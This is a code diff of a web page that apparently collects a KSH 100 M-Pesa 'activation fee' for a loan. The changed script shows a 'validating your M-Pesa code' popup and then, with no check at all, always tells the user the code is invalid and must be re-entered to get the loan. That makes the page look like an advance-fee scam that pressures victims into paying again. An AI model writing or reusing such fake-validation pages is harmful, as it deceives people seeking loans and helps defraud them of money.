@@ -12,25 +12,24 @@
     <script type="text/javascript">
 function showAlert() {
   swal("THANKS FOR THE APPLICATION....WAIT AS WE VALIDATE THE M-PESA CODE", {
-    icon: "info",
+    icon: "success",
+  }).then(() => {
+    // This will be executed after the first alert is dismissed
+    showAlerts();
   });
 }
-    //Event listener for DOMContentLoaded event
-document.addEventListener('DOMContentLoaded', function() {
-  showAlert(); // Call the showAlert function when the DOM is fully loaded
-});
-    </script>
-    <script type="text/javascript">
-function showAlert() {
+
+function showAlerts() {
   swal("SORRY...THE M-PESA CODE YOU ENTERED IS INVALID!!!! PLEASE ENTER THE CORRECT CODE TO GET YOUR LOAN", {
-    icon: "info",
+    icon: "error",
   });
-}
-    //Event listener for DOMContentLoaded event
+}  
+
+// Event listener for DOMContentLoaded event
 document.addEventListener('DOMContentLoaded', function() {
   showAlert(); // Call the showAlert function when the DOM is fully loaded
 });
-    </script>
+</script>
     <p>Activate your account to get your loan immediately </p>
     ACTIVATION FEE ==KSH 100 only
     <br /><br/>
